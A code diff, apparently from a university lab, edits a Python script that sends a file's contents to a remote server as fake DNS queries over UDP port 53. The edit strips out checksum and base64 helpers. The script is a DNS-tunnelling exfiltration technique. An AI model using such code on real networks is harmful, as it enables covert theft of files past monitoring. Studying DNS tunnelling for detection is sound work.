@@ -1,21 +1,9 @@
 import socket
 import logging
 import os
-import hashlib
-import base64
-
-def generate_checksum(file_path):
-    hash_md5 = hashlib.md5()
-    with open(file_path, "rb") as f:
-        for chunk in iter(lambda: f.read(4096), b""):
-            hash_md5.update(chunk)
-    return hash_md5.hexdigest()
 
 # Configure logging to display information, including the timestamp, log level, and the message
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-def encode_base64(data):
-    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
 
 def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60):
     """
@@ -30,10 +18,6 @@ def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60)
 
     # Construct the full path to the file based on the current working directory and the specified filename.
     file_path = os.path.join(os.getcwd(), 'payload', filename)
-
-    # Generate the checksum of the file
-    checksum = generate_checksum(file_path)
-    logging.info(f"Checksum: {checksum}")
 
     # Open the file in binary read mode.
     with open(file_path, 'rb') as file:
@@ -51,11 +35,8 @@ def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60)
             # Format packet number with leading zeros
             packet_number_str = str(packet_number).zfill(4)
 
-            # Base64-encode the chunk to ensure it's text-friendly
-            chunk_encoded = encode_base64(chunk)
-
             # Append a pseudo domain to the chunk to simulate a DNS query.
-            query = f"{packet_number_str}:{chunk_encoded}.towson.edu:{checksum}"
+            query = f"{packet_number_str}:{chunk}.towson.edu"
 
             # Create a UDP socket.
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
